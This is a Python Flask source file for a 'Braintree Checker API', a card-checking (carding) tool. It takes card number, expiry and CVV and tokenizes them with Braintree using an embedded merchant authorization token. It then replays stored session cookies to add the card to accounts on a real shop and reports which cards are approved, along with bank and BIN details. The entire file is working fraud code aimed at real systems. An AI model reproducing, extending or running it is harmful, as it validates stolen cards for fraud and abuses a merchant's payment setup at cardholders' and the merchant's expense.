from flask import Flask, request, jsonify
import requests
import random
import time
import glob
import os

app = Flask(__name__)

# Cookie management
SELECTED_COOKIE_PAIR = None

def discover_cookie_pairs():
    try:
        pattern1 = 'cookies_*-1.txt'
        pattern2 = 'cookies_*-2.txt'
        files1 = glob.glob(pattern1)
        files2 = glob.glob(pattern2)
        
        pairs = []
        for file1 in files1:
            pair_id = file1.replace('cookies_', '').replace('-1.txt', '')
            file2_expected = f'cookies_{pair_id}-2.txt'
            if file2_expected in files2:
                pairs.append({'id': pair_id, 'file1': file1, 'file2': file2_expected})
        return pairs
    except:
        return []

def select_new_cookie_pair():
    global SELECTED_COOKIE_PAIR
    pairs = discover_cookie_pairs()
    if pairs:
        SELECTED_COOKIE_PAIR = random.choice(pairs)
    return SELECTED_COOKIE_PAIR

def read_cookies_from_file(filename):
    try:
        with open(filename, 'r') as f:
            content = f.read()
            namespace = {}
            exec(content, namespace)
            return namespace['cookies']
    except:
        return {}

# Braintree Headers
headers = {
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NjI0MTkwNzksImp0aSI6ImM0ODA2MTRkLTZhZGYtNDEzZS05ZjJiLWQ0YzcyMWQ1YmY4YSIsInN1YiI6IjM2NHpiN3dweWgzOTJkcXMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjM2NHpiN3dweWgzOTJkcXMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlLCJ2ZXJpZnlfd2FsbGV0X2J5X2RlZmF1bHQiOmZhbHNlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiLCJCcmFpbnRyZWU6Q2xpZW50U0RLIl0sIm9wdGlvbnMiOnsicGF5cGFsX2NsaWVudF9pZCI6IkFid0oxWnptZVFtYlFFTlBHeURlcWNsQTc2OWNkcjZGbjlJLWYxTGZvYUkzek5HcVk2MEItWWc3V04tUlNPQXVUWHZIdnlPaFBwRHNkRzl6In19.aY0vsDVuHYvE5MA0UNOF_9ETu6MpQma8x3w7-gJMEtHU5g9NCq_Di6kZxmeAK6IziUeZfhcFIeW9Rm8PqnXq2Q',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://www.tea-and-coffee.com',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
}

def tokenize_card(cc, mm, yy, cvv):
    """Real Braintree tokenization with actual validation"""
    json_data = {
        'clientSdkMetadata': {'source': 'client', 'integration': 'custom', 'sessionId': f'session_{random.randint(10000,99999)}'},
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 } } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': cc.replace(" ", ""),
                    'expirationMonth': mm.zfill(2),
                    'expirationYear': yy if len(yy) == 4 else f'20{yy}',
                    'cvv': cvv,
                    'billingAddress': {'postalCode': '10080'}
                }
            }
        },
        'operationName': 'TokenizeCreditCard'
    }
    
    try:
        response = requests.post('https://payments.braintree-api.com/graphql', 
                               headers=headers, json=json_data, timeout=15)
        
        if response.status_code == 200:
            data = response.json()
            # REAL CHECK - Only return token if valid card
            if data.get('data', {}).get('tokenizeCreditCard', {}).get('token'):
                return data['data']['tokenizeCreditCard']['token']
            else:
                # Check for actual errors from Braintree
                if 'errors' in data:
                    error_msg = data['errors'][0].get('message', 'Card validation failed')
                    return f"DECLINED: {error_msg}"
        return "DECLINED: Tokenization failed"
    except Exception as e:
        return f"ERROR: {str(e)}"

def check_card_via_woocommerce(token):
    """Real check by adding payment method"""
    try:
        select_new_cookie_pair()
        cookies = read_cookies_from_file(SELECTED_COOKIE_PAIR['file1'])
        
        data = {
            'payment_method': 'braintree_cc',
            'wc_braintree_credit_card_payment_nonce': token,
            'woocommerce-add-payment-method-nonce': 'test_nonce',
            '_wp_http_referer': '/account/payment-methods/',
            'woocommerce_add_payment_method': '1',
        }
        
        headers_submit = {
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.tea-and-coffee.com',
            'referer': 'https://www.tea-and-coffee.com/account/payment-methods/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        session = requests.Session()
        session.cookies.update(cookies)
        response = session.post('https://www.tea-and-coffee.com/account/add-payment-method/', 
                              data=data, headers=headers_submit, timeout=15)
        
        # REAL RESPONSE ANALYSIS
        if response.status_code == 200:
            if 'Payment method successfully added' in response.text:
                return "APPROVED"
            elif 'CVV' in response.text:
                return "CVV DECLINED" 
            elif 'declined' in response.text.lower():
                return "DECLINED"
            else:
                return "UNKNOWN RESPONSE"
        return "REQUEST FAILED"
        
    except Exception as e:
        return f"ERROR: {str(e)}"

@app.route('/cc=<path:card_data>', methods=['GET'])
def check_card(card_data):
    """API endpoint for card checking"""
    start_time = time.time()
    
    try:
        # Parse card data
        parts = card_data.split('|')
        if len(parts) != 4:
            return jsonify({"status": "ERROR", "message": "Invalid format. Use: /cc=number|mm|yy|cvv"})
        
        cc, mm, yy, cvv = parts
        
        # Step 1: Tokenize with Braintree (REAL CHECK)
        token_result = tokenize_card(cc, mm, yy, cvv)
        
        if token_result.startswith("DECLINED") or token_result.startswith("ERROR"):
            elapsed = time.time() - start_time
            return jsonify({
                "status": "DECLINED",
                "message": token_result,
                "card": f"{cc}|{mm}|{yy}|{cvv}",
                "gateway": "Braintree",
                "time": f"{elapsed:.2f}s",
                "bin_info": get_bin_info(cc[:6])
            })
        
        # Step 2: Real WooCommerce check
        wc_result = check_card_via_woocommerce(token_result)
        
        elapsed = time.time() - start_time
        
        return jsonify({
            "status": "APPROVED" if wc_result == "APPROVED" else "DECLINED",
            "message": wc_result,
            "card": f"{cc}|{mm}|{yy}|{cvv}",
            "gateway": "Braintree", 
            "token": token_result[:20] + "...",
            "time": f"{elapsed:.2f}s",
            "bin_info": get_bin_info(cc[:6]),
            "cookie_pair": SELECTED_COOKIE_PAIR['id'] if SELECTED_COOKIE_PAIR else "N/A"
        })
        
    except Exception as e:
        return jsonify({"status": "ERROR", "message": str(e)})

def get_bin_info(bin_number):
    try:
        response = requests.get(f'https://api.voidex.dev/api/bin?bin={bin_number}', timeout=5)
        if response.status_code == 200:
            data = response.json()
            return {
                'brand': data.get('brand', 'UNKNOWN'),
                'type': data.get('type', 'UNKNOWN'),
                'bank': data.get('bank', 'UNKNOWN'),
                'country': data.get('country_name', 'UNKNOWN')
            }
        return {'brand': 'UNKNOWN', 'type': 'UNKNOWN', 'bank': 'UNKNOWN', 'country': 'UNKNOWN'}
    except:
        return {'brand': 'UNKNOWN', 'type': 'UNKNOWN', 'bank': 'UNKNOWN', 'country': 'UNKNOWN'}

@app.route('/')
def home():
    return jsonify({"message": "Braintree Checker API", "usage": "/cc=4848100093994495|07|2029|418"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
